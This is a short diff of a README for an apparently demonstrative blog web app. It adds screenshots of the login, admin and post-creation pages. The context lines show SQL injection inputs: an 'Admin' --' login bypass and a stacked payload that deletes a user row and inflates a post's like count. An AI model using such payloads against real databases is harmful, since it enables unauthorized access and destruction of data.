@@ -54,3 +54,20 @@ Admin' --
 ```sql
 ' ; DELETE FROM users WHERE ROWID = (SELECT MAX(ROWID) FROM users) OR username = "'; UPDATE blog_posts SET number_likes = number_likes + 10 WHERE id = 1 --" --
 ```
+
+
+## Images of the blog website:
+
+#### Log in:
+
+<img src="Screenshot 2023-04-17 at 12.33.24.png" alt="My Image" style="max-width: 70%;">
+
+#### Logged in as admin (only difference is the remove button):
+
+
+<img src="Screenshot 2023-04-17 at 12.34.25.png" alt="My Image" style="max-width: 70%;">
+
+#### Create post and change password:
+
+<img src="Screenshot 2023-04-17 at 12.34.34.png" alt="My Image" style="max-width: 70%;">
+
